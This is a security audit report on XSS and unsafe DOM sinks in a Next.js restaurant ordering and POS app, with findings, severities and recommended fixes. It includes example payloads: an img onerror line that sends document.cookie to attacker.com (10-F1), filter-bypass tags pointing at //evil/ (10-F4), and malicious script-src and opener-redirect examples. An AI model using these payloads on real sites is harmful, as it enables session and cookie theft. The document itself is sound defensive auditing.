# Audit 10 — XSS / HTML Injection / Unsafe DOM Sinks

**Phase:** 3 — Security
**Date:** 2026-05-05
**Scope:** Every appearance of `dangerouslySetInnerHTML`, `innerHTML`, `outerHTML`, `document.write`, `eval`, `new Function`, `insertAdjacentHTML`. The `RichEditor`, email templates, receipt builders, custom-head injection, custom pages, and footer pages. Cross-cutting: any data path where user-controlled content reaches HTML output.
**Mode:** Read-only

---

## 1. Methodology

1. Grep'd unsafe DOM sinks across [app/src/](../app/src/).
2. For each hit, traced the value flowing into the sink to its source (admin-edited setting? customer-edited field? URL param? DB field?).
3. Cross-referenced the sanitization helpers (`escHtml`, `sanitizePreviewHtml`) — checked which paths actually use them and which don't.
4. Looked at the print-window flow (`window.open` + `document.write`) since it crosses an origin/security boundary.

The codebase has **two custodial XSS controls**:
- `escHtml(s)` in [emailTemplates.ts:261](../app/src/lib/emailTemplates.ts#L261) — standard 5-char HTML encoder. Used in email var maps for user-supplied fields.
- `sanitizePreviewHtml(html)` in [EmailTemplatesPanel.tsx:28](../app/src/components/admin/EmailTemplatesPanel.tsx#L28) — strips `<script>`, `<iframe>`, `<object>`, `<embed>`, and `on*=` attributes via regex.

Neither uses a parser-based sanitizer (e.g. DOMPurify, sanitize-html). All sanitization is regex-based.

## 2. Inventory of unsafe sinks (16 sites)

| # | Sink | File | Line | Source | Reaches sanitizer? |
|---:|---|---|---:|---|---|
| 1 | `dangerouslySetInnerHTML` | [layout.tsx](../app/src/app/layout.tsx) | 133 | server-built `colorCss` (CSS string from admin colors) | n/a — `<style>` content, not HTML |
| 2 | `dangerouslySetInnerHTML` (inline `<script>`) | [layout.tsx](../app/src/app/layout.tsx) | 140 | static `FOUC_FALLBACK_SCRIPT` constant | safe — fixed string |
| 3 | `dangerouslySetInnerHTML` | [(site)/[footerPage]/page.tsx](../app/src/app/(site)/[footerPage]/page.tsx) | 25 | `page.content` from `settings.footerPages` / `settings.customPages` (admin-edited via `RichEditor`) | ⛔ **no sanitization** |
| 4 | `dangerouslySetInnerHTML` | [EmailTemplatesPanel.tsx](../app/src/components/admin/EmailTemplatesPanel.tsx) | 283 | preview HTML built from email template + sample vars | ✓ via `sanitizePreviewHtml` |
| 5 | `innerHTML` | [SeoHead.tsx](../app/src/components/SeoHead.tsx) | 31 | `settings.customHeadCode` (admin-edited) | ⛔ **no sanitization, then re-creates `<script>` tags as live nodes** |
| 6 | `innerHTML` (read) | [EmailTemplatesPanel.tsx](../app/src/components/admin/EmailTemplatesPanel.tsx) | 60 | reads from cloned tree | reading is safe |
| 7 | `innerHTML` (write) | [EmailTemplatesPanel.tsx](../app/src/components/admin/EmailTemplatesPanel.tsx) | 78 | `storageToDisplay(initialValue)` — `initialValue` comes from saved template string | ⛔ no sanitization on write |
| 8 | `innerHTML` (write) | [RichEditor.tsx](../app/src/components/admin/RichEditor.tsx) | 43 | `initialValue` — saved page content | ⛔ no sanitization on write |
| 9 | `innerHTML` (read) | [RichEditor.tsx](../app/src/components/admin/RichEditor.tsx) | 61, 125 | reads from contenteditable | reading is safe |
| 10 | `document.write` | [waiter/page.tsx](../app/src/app/waiter/page.tsx) | 102 | `buildReceiptHtml(receipt, ...)` — interpolates `receipt.items[*].name`, `restaurantName`, `receiptPhone`, `receiptWebsite`, `vatNumber`, `thankYou`, `tableLabel`, `waiterName` directly | ⛔ **no escaping** — see 10-F1 |
| 11 | `document.write` | [waiter/page.tsx](../app/src/app/waiter/page.tsx) | 1076 | static template literal; no user input | safe |
| 12 | `document.write` | [waiter/page.tsx](../app/src/app/waiter/page.tsx) | 1367 | dine-in receipt HTML (similar pattern to 10) | ⛔ no escaping |
| 13 | `document.write` | [pos/page.tsx](../app/src/app/pos/page.tsx) | 1463 | `buildReceiptHtml(sale, settings, ...)` — interpolates `sale.customerName`, `sale.staffName`, `sale.discountNote`, `settings.restaurantName`, etc. | ⛔ no escaping |
| 14 | `document.write` | [CustomersPanel.tsx](../app/src/components/admin/CustomersPanel.tsx) | 381 | `buildPrintHtml(order, customer, rs, restaurantAddress)` — interpolates `customer.name`, `order.address`, `order.couponCode`, `order.paymentMethod`, `rs.thankYouMessage`, `rs.customMessage`, `rs.restaurantName`, etc. | ⛔ no escaping |

## 3. Findings

### 10-F1 — Receipt builders interpolate user-controlled fields into HTML without escaping
**Severity:** 🔴 High
**Evidence:** Three different `buildReceiptHtml` / `buildPrintHtml` functions in different files, all use template-literal interpolation:
- [waiter/page.tsx:57–89](../app/src/app/waiter/page.tsx#L57): interpolates `restaurantName`, `receiptPhone`, `receiptWebsite`, `vatNumber`, `thankYou`, `receipt.tableLabel`, `receipt.waiterName`, every `receipt.items[*].name` directly via `${...}`. No `escHtml` calls.
- [pos/page.tsx:417](../app/src/app/pos/page.tsx#L417): same pattern (saw the structure in Audit 02; need 03-F13 dedup follow-up).
- [CustomersPanel.tsx:284–353](../app/src/components/admin/CustomersPanel.tsx#L284): worse — interpolates `order.address`, `order.couponCode`, `customer.name`, plus `rs.thankYouMessage`, `rs.customMessage` (admin-edited) directly, including the `customMessage` with `white-space:pre-wrap` so newlines are preserved but HTML is too.

The HTML from these functions is then either:
- Written into a new `window.open(...)` document via `document.write(html)` — same-origin window, can read `document.cookie`, etc.
- Sent as the body of an email via `POST /api/email` ([waiter/page.tsx:117](../app/src/app/waiter/page.tsx#L117)).

**Why it matters:**
- **Stored XSS via menu item names**: a malicious admin (or anyone exploiting 06-F1's mass-assignment to write to `menu_items`) sets a menu item name to `<img src=x onerror="fetch('//attacker.com/?c='+document.cookie)">`. When the waiter prints the receipt for that table, the receipt window executes the script in the same origin. Same-origin window has access to:
  - `document.cookie` (httpOnly cookies are NOT readable, but non-httpOnly cookies if any exist are).
  - `localStorage` of the parent app — including `pos_session`, `pos_sales`, `sg_current_user`, `sg_driver_session`. **All sensitive caches enumerated in Audit 04 are readable.**
  - `postMessage` to / from the opener.
- **Receipt-by-email vector** ([waiter/page.tsx:117](../app/src/app/waiter/page.tsx#L117)): the same un-escaped HTML is sent as the email `html` body. Customer's email client sees it. Most email clients sandbox HTML, but image `onerror` triggers the same network beacon → tracking pixel / phishing redirect.
- **Customer name** is one of the interpolated fields. Customers control their own name (via [api/customers/[id]](../app/src/app/api/customers/[id]/route.ts) PATCH which allows the `name` field), so this is **a customer-controlled stored XSS into staff devices** — the highest-impact direction (low-trust → high-trust).
- **Admin-controlled fields** (`thankYouMessage`, `customMessage`, `restaurantName`, `vatNumber`, `phone`, `website`, `email`) are admin-trusted but cross-ref 06-F16 (single shared admin password) and 08-F3 (admin-settings JSON not validated): a single admin compromise pivots into all staff devices.

**Possible action:**
1. Add an `escHtml(s)` helper colocated with the receipt builder (or import the one from [emailTemplates.ts:261](../app/src/lib/emailTemplates.ts#L261); cross-ref 03-F11 dedup).
2. Wrap every `${variable}` from user/admin/customer data: `${escHtml(it.name)}`, `${escHtml(receipt.tableLabel)}`, etc.
3. Cross-ref 03-F13: when the 4 receipt builders are unified into one [features/print/lib/receipt-html.ts](../app/src/lib/), bake the escaping in.

### 10-F2 — `customHeadCode` lets admin inject arbitrary `<script>` tags into every page
**Severity:** 🔴 Critical (admin-trusted but blast-radius is the entire site)
**Evidence:** [SeoHead.tsx:30–43](../app/src/components/SeoHead.tsx#L30):
```ts
const tpl = document.createElement("template");
tpl.innerHTML = customHeadCode;
const fragment = tpl.content;

fragment.querySelectorAll("script").forEach((inert) => {
  const live = document.createElement("script");
  inert.getAttributeNames().forEach((attr) => {
    live.setAttribute(attr, inert.getAttribute(attr)!);
  });
  if (inert.textContent) live.textContent = inert.textContent;
  live.setAttribute("data-sg-head", "true");
  document.head.appendChild(live);
  inert.remove();
});
```
The code **deliberately** revives inert `<script>` tags from `<template>` parsing into live, executable scripts. `customHeadCode` is admin-edited via [components/admin/OperationsPanel.tsx](../app/src/components/admin/OperationsPanel.tsx) (CustomHeadCard) and stored in `app_settings.data.customHeadCode`.
**Why it matters:**
- **Intended functionality.** Admins use this to add Google Analytics, Meta Pixel, etc. — that requires `<script>` execution. So this isn't a bug; it's the feature.
- **Risk surface:**
  - **Single shared admin password** (06-F16): one leaked admin password = persistent script injection on every page of the site.
  - **No CSP** (cross-ref 10-F8): nothing stops the injected script from loading from an attacker-controlled domain.
  - **Site-wide blast**: `SeoHead` is mounted from [AppContext](../app/src/context/AppContext.tsx) (line 22), so the injected scripts run on the customer site, the admin panel, every staff page. Attacker can capture admin sessions if the injection happens before logout.
  - **Validation gap (08-F3):** `customHeadCode` is part of `app_settings.data` which has no schema validation. An attacker who finds any other way to write to `app_settings` (e.g. a future bug in 08-F1 mass-assignment) gets script execution.
- **`<style>` and `<link>`** are also passed through ([line 45–51](../app/src/components/SeoHead.tsx#L45)): `<link rel="stylesheet" href="//evil.com/x.css">` enables CSS-based exfiltration.
**Possible action:**
1. **Accept the design but harden access**: per-admin accounts + 2FA (cross-ref 06-F16). The "code injection" feature is fine for one admin but unsafe with shared credentials.
2. Add a CSP `nonce` requirement and only allow `customHeadCode` scripts to bear that nonce (server-injected). Then a stolen admin password requires also stealing the per-request nonce → harder.
3. Constrain to known third-party hosts via an allowlist (e.g. only `googletagmanager.com`, `connect.facebook.net`, etc.). Most admin UIs do this in production.
4. Surface a clear UI warning when editing `customHeadCode`: "Anything here runs on every page."

### 10-F3 — `customPages` / `footerPages` `content` rendered with `dangerouslySetInnerHTML` and no sanitization
**Severity:** 🔴 High
**Evidence:** [(site)/[footerPage]/page.tsx:25](../app/src/app/(site)/[footerPage]/page.tsx#L25):
```tsx
<div className="rich-content" dangerouslySetInnerHTML={{ __html: page.content }} />
```
`page.content` comes from `settings.footerPages[*].content` or `settings.customPages[*].content`. Edited by admin via [components/admin/RichEditor.tsx](../app/src/components/admin/RichEditor.tsx). The editor uses `document.execCommand` (no sanitization) and stores raw `innerHTML`. **Anything an admin pastes into the editor — including `<script>`, `<iframe>`, `onclick` handlers — is stored verbatim in `app_settings` and rendered to the public site.**
**Why it matters:**
- Cross-ref 10-F2: if the admin password is shared/leaked, attacker creates a custom page with malicious script and posts the URL. Public traffic visits → script runs.
- Cross-ref 08-F3: `app_settings.data` is anon-readable (07-F2). A malicious settings write doesn't even need admin auth if any of the mass-assignment paths (08-F1) is exploitable.
- Even without external compromise: admin pasting copy-pasted HTML from the web inadvertently brings in tracking pixels, third-party iframes, etc.
**Possible action:**
1. **Server-side sanitize on save** using DOMPurify or sanitize-html. Block `<script>`, `<iframe>`, `<object>`, `<embed>`, `<form>`, all `on*` event handlers, `javascript:` and `data:` URLs in `href`/`src`.
2. Render only the sanitized output. Storing the unsanitized version is a footgun if sanitization changes later — store both, or only the sanitized.
3. The same applies wherever `RichEditor` content is consumed — currently footer pages and custom pages. **Email templates** also pass HTML through `applyVars` and `sanitizePreviewHtml` (regex-based; partial protection — see 10-F4).

### 10-F4 — `sanitizePreviewHtml` is regex-based and incomplete
**Severity:** 🟡 Medium
**Evidence:** [EmailTemplatesPanel.tsx:28–35](../app/src/components/admin/EmailTemplatesPanel.tsx#L28):
```ts
function sanitizePreviewHtml(html: string): string {
  return html
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script\s*>/gi, "")
    .replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe\s*>/gi, "")
    .replace(/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object\s*>/gi, "")
    .replace(/<embed\s[^>]*>/gi, "")
    .replace(/\bon\w+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]*)/gi, "");
}
```
Bypasses (any of these defeats the regex):
- Mutation XSS via stripped tag re-parsing: `<scr<script>ipt>alert(1)</script>` — stripping the inner `<script>...</script>` leaves `<script>` outside.
  - Wait, the inner closing `</script>` doesn't exist; this specific input fails. But the general pattern of "strip-then-reparse" creates new sinks.
- `<svg>` / `<math>` (foreign content) with embedded handlers: `<svg><script>alert(1)</script></svg>` — the inner `<script>` is matched, but `<svg onload=alert(1)>` matches `on\w+=` only if there's an `=`. `<svg/onload=alert(1)>` (no space) isn't blocked because `\bon\w+` requires word-boundary preceded by non-word → `/` is non-word → matches. OK that one is caught.
- `<a href="javascript:alert(1)">` — not blocked (no `on*=`).
- `<img src=x onerror=alert(1)>` — `onerror=` is matched by `\bon\w+\s*=` (✓).
- `<style>@import url('//evil/x.css');</style>` — not blocked.
- `<base href="//evil/">` rewrites all relative links — not blocked.
- `<form action="//evil/">` — not blocked.
- `<meta http-equiv="refresh" content="0;url=//evil/">` — not blocked.
- `<link rel="stylesheet" href="//evil/">` — not blocked.

Also note [EmailTemplatesPanel.tsx:283](../app/src/components/admin/EmailTemplatesPanel.tsx#L283) only sanitizes the *preview*. The actual email body sent to recipients via `/api/email` is built by `applyVars + buildEmailDocument` — that HTML is NOT run through this sanitizer.
**Why it matters:**
- This is specifically the *preview* — admin preview only. The blast radius is "admin sees malicious HTML in their browser." Not user-facing. So severity is medium (limited audience), not critical.
- But it's a fragile pattern. Better to use DOMPurify which handles all the bypasses above.
**Possible action:**
1. Replace with DOMPurify.
2. Or render the preview in an `<iframe sandbox="allow-same-origin">` to contain script execution (note: even with sandbox, the iframe shares origin — true isolation requires `srcdoc` + no `allow-scripts`).

### 10-F5 — Email template body fields admin-controlled, only ~6 known-user-source vars escaped
**Severity:** 🟡 Medium
**Evidence:** [emailTemplates.ts:381–391](../app/src/lib/emailTemplates.ts#L381):
```ts
customer_name:      escHtml(customer?.name    ?? ""),
customer_email:     escHtml(customer?.email   ?? ""),
delivery_address:   escHtml(order.address     ?? ""),
payment_method:     escHtml(order.paymentMethod ?? ""),
// ...
order_items:        orderItemsTable,   // server-built HTML — do not escape
brand_color:        primaryColor,       // hex — used in style attributes, not escaped
```
- ✓ Customer-supplied fields are properly escaped before being substituted into templates.
- The template *itself* (subject + body) comes from admin-edited `app_settings.data.emailTemplates`. That admin HTML is treated as trusted: no sanitization on the way in or out. Same risk model as 10-F3.
- `order_items` builds its own HTML server-side from order data. Item names are NOT escaped:
  ```ts
  `<tr><td...>${i.name} × ${i.qty}</td>...`
  ```
  Cross-ref 10-F1 — same root cause. A `<script>`-containing item name reaches the customer's email client. Most clients sandbox, but the pattern is wrong.
- `primaryColor` not escaped before being used in `style=` attributes. If admin pastes `#fff;}</style><script>...` into the color picker, it could break out — but the color picker stores hex only, so this is a low-actual-risk path. Worth tightening at the input side to enforce `^#[0-9a-fA-F]{6}$`.
**Possible action:**
1. Add `escHtml(i.name)` in the orderItemsTable builder.
2. Validate `primaryColor` on the way in (admin settings save) to ensure hex-only.
3. Strategic: server-side DOMPurify pass on the final assembled email HTML before sending.

### 10-F6 — Customer-controlled `customer.name` flows into receipts (and POS sales) without escaping
**Severity:** 🔴 High (focused subset of 10-F1, called out for clarity)
**Evidence:**
- Customer can write their own name via [api/customers/[id]](../app/src/app/api/customers/[id]/route.ts) PATCH (`ALLOWED_FIELDS` includes `name`).
- Order placement via `/api/orders` does NOT escape `customer_id`-linked customer name; the name lives in the `customers.name` column.
- Receipt builders read it. [CustomersPanel.tsx:329](../app/src/components/admin/CustomersPanel.tsx#L329): `<span>${customer.name}</span>`.
- The receipt window opens via `window.open` + `document.write` — same-origin to the admin page that's currently rendering admin secrets / admin session cookies.
**Why it matters:**
- **Stored XSS chain**: customer (low trust) → DB → admin/staff browser (high trust) → script execution with access to admin localStorage/Realtime channels. This is the attack class where input-validation theater (06-F3 client-only fields) doesn't help — even with `name` allowlist-only, the value isn't constrained or escaped.
- POS staff name field is more constrained (set by admin), but the same blueprint applies if any of those settings paths is mass-assignable (08-F1).
**Possible action:**
1. Same as 10-F1 — escape on output.
2. Constrain at input: name field validation (no `<`, `>`, length cap, etc.). Cross-ref 08-F4.
3. Render with `textContent` instead of innerHTML where possible (in React land that means JSX text nodes — but the print path uses `document.write`, which forces HTML).

### 10-F7 — `colorCss` injection via `dangerouslySetInnerHTML` into `<style>`
**Severity:** 🟡 Low (CSS, not HTML — but still has bypasses)
**Evidence:** [layout.tsx:130–134](../app/src/app/layout.tsx#L130). `colorCss` is built server-side from `data.colors.primaryColor` + `backgroundColor` via `buildColorCss` in [lib/colorUtils.ts](../app/src/lib/colorUtils.ts).
**Why it matters:**
- If `buildColorCss` doesn't strictly validate hex format, a malicious settings write can inject CSS-based attacks (selector exfiltration, `@import` to attacker-controlled stylesheet, `url("javascript:...")` if any browser still supports it — most don't).
- If the color value contains `</style><script>...`, the closing `</style>` ends the style block and the script executes.
**Possible action:** Confirm [colorUtils.ts](../app/src/lib/colorUtils.ts) validates input is a valid hex color before producing CSS. If not, add validation.

### 10-F8 — No Content-Security-Policy header
**Severity:** 🟡 Medium (defense-in-depth, would mitigate several findings)
**Evidence:** [next.config.ts](../app/next.config.ts) — need to confirm — no obvious CSP setup. `middleware.ts` doesn't set CSP headers. No `Content-Security-Policy` meta tag in `layout.tsx`.
**Why it matters:**
- A correctly-configured CSP would reduce blast radius of every XSS finding above. `script-src 'self'` blocks inline scripts (forcing a rewrite of `customHeadCode` to use server-injected nonces — see 10-F2).
- `default-src 'self'` blocks resource fetches to attacker domains.
- Modern Next.js supports CSP via `headers()` in `next.config.ts` or per-route via middleware.
**Possible action:**
1. Add a baseline CSP in `next.config.ts`: `default-src 'self'; img-src 'self' data: https:; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{NONCE}'`.
2. Ratchet down `unsafe-inline` over time (requires a nonce/hash strategy for the FOUC script and color CSS).
3. Add `Strict-Transport-Security`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin` while you're at it.

### 10-F9 — `window.open(...)` for print does not pass `noopener`/`noreferrer`
**Severity:** 🟡 Low
**Evidence:** [waiter/page.tsx:100](../app/src/app/waiter/page.tsx#L100): `window.open("", "_blank", "width=400,height=600")`. Same in pos/page.tsx and CustomersPanel.tsx.
**Why it matters:**
- The opened window has access to `window.opener`. Malicious script in the print window (via 10-F1) can `window.opener.location = "//phish.com"` to redirect the parent tab.
- Less of a concern when 10-F1 is fixed (no script in print window), but a layered defense.
**Possible action:** Add `noopener,noreferrer` to features string. Or set `win.opener = null` immediately after open.

### 10-F10 — Editor stores raw HTML; no sanitization on either save or load
**Severity:** 🟡 Medium (compound with 10-F3)
**Evidence:** [RichEditor.tsx:43](../app/src/components/admin/RichEditor.tsx#L43): `editorRef.current.innerHTML = initialValue;` — admin-typed HTML is loaded back without sanitization. [line 61, 125](../app/src/components/admin/RichEditor.tsx#L61): `onChange(editorRef.current.innerHTML)` saves raw HTML.
**Why it matters:**
- `document.execCommand` itself sometimes generates unwanted HTML constructs that browsers later interpret differently. Edge cases with copy-paste from Word/Google Docs introduce `<style>` blocks, `<o:p>` tags, etc.
- Cross-ref 10-F3: the saved value is used in `dangerouslySetInnerHTML` on the public site. So an admin pasting attacker-controlled HTML (e.g. an instruction email saying "paste this fancy template into your About page") plants persistent XSS.
**Possible action:**
1. Sanitize on save: pass `editorRef.current.innerHTML` through DOMPurify before `onChange`.
2. Restrict the editor to a known tag set: paragraphs, headings, lists, links (with `rel="noopener noreferrer"` enforcement), images. No raw HTML.
3. Strip `<style>`, `<script>`, `<iframe>`, `on*=`, `javascript:` URLs.

### 10-F11 — `setAttribute(attr, inert.getAttribute(attr)!)` re-creates script with attacker-controlled `src`
**Severity:** 🔴 High (subset of 10-F2)
**Evidence:** [SeoHead.tsx:36–38](../app/src/components/SeoHead.tsx#L36):
```ts
inert.getAttributeNames().forEach((attr) => {
  live.setAttribute(attr, inert.getAttribute(attr)!);
});
```
Copies *every* attribute from the original tag. So `<script src="//evil/x.js" integrity="...">` survives unchanged.
**Why it matters:** Same as 10-F2 — calling out that even if `customHeadCode` is sanitized to "no inline JS," the `src=` attribute alone is enough.
**Possible action:** Same as 10-F2 — host allowlist on `src`.

### 10-F12 — `escHtml` is duplicated / inconsistently applied
**Severity:** 🟡 Low (cross-ref 03-F11 / dedup)
**Evidence:** Only one definition of `escHtml` exists ([emailTemplates.ts:261](../app/src/lib/emailTemplates.ts#L261)) — but it's not exported. The receipt builders in [waiter/page.tsx](../app/src/app/waiter/page.tsx), [pos/page.tsx](../app/src/app/pos/page.tsx), and [CustomersPanel.tsx](../app/src/components/admin/CustomersPanel.tsx) don't import it. Even if they wanted to, they can't (it's a private function).
**Why it matters:** Why 10-F1 happened. The helper exists; nothing makes it the canonical primitive.
**Possible action:**
1. Move `escHtml` to [lib/strings.ts](../app/src/lib/) (or [lib/format.ts](../app/src/lib/)) and export it.
2. Cross-ref 03-F11 dedup: when the formatting helpers are consolidated, escape helpers go with them.
3. ESLint custom rule to flag template-literal HTML interpolation without `escHtml(...)` for known unsafe sources is *possible* but expensive; a code-review checklist might be enough.

## 4. Severity summary

| Severity | IDs | Theme |
|---|---|---|
| 🔴 **Critical** | 10-F2 (customHeadCode arbitrary script injection — by design, but compounded by 06-F16 and no CSP) | |
| 🔴 **High** | 10-F1 (receipt builders unescaped — customer→staff stored XSS), 10-F3 (footer/custom pages render unsanitized HTML), 10-F6 (customer-controlled name into receipts), 10-F11 (script `src` survives re-creation) | |
| 🟡 **Medium** | 10-F4 (regex-based `sanitizePreviewHtml`), 10-F5 (order_items / primaryColor unescaped), 10-F8 (no CSP), 10-F10 (editor stores raw HTML) | |
| 🟡 **Low** | 10-F7 (colorCss validation depends on buildColorCss), 10-F9 (`window.open` no `noopener`), 10-F12 (escHtml duplicated/private) | |

## 5. Highest-ROI fixes — recommended order

1. **Export `escHtml` and apply it to the 3 receipt builders (10-F1, 10-F6).** Mechanical: ~30 interpolation sites total. Closes the customer→staff XSS vector.
2. **Install DOMPurify and sanitize `RichEditor` content on save (10-F3, 10-F10).** Server-side validation in the relevant admin route + client-side sanitization on save. Stops persistent XSS via custom pages.
3. **Add a baseline CSP via `next.config.ts` (10-F8).** Even a permissive CSP (`'unsafe-inline'` allowed) blocks third-party domains by default. Strictness can ratchet over time.
4. **Replace `sanitizePreviewHtml` with DOMPurify (10-F4).** Same dependency as #2, free win.
5. **Harden `customHeadCode`** with a host allowlist (10-F2, 10-F11). Optional: a CSP nonce strategy that admins must bypass per-script.
6. **Validate `primaryColor` is hex on save (10-F5, 10-F7).** One regex check.
7. **`window.open(... "noopener,noreferrer")` (10-F9).** Trivial.
8. **Apply `escHtml` to `i.name` in `orderItemsTable` (10-F5).** Three lines.

## 6. Open questions for the user

1. **`customHeadCode` (10-F2):** is this feature actually used in production? If yes, by whom, for what (analytics? marketing pixels?)? Affects whether we lock it down with an allowlist or remove it entirely.
2. **DOMPurify dependency (10-F3, 10-F4, 10-F10):** OK to add (~10 KB gzip)? Alternative is sanitize-html (server-only, larger).
3. **CSP rollout (10-F8):** is the project currently behind a CDN/proxy that could enforce CSP at the edge, or do we add it via Next.js? Per-page nonce strategy or static policy?
4. **Receipt PII (10-F6):** customer name on receipts is required by VAT receipt rules in the UK. We can't drop it — escape it.

## 7. What's next

- This concludes **Phase 3 — Security**.
- Next: **Phase 4 — API layer** begins with Audit 11 (API consistency) — error response shape, status code conventions, `apiHandler.ts` actual usage, naming convention drift identified in 01-F6/03-F16.
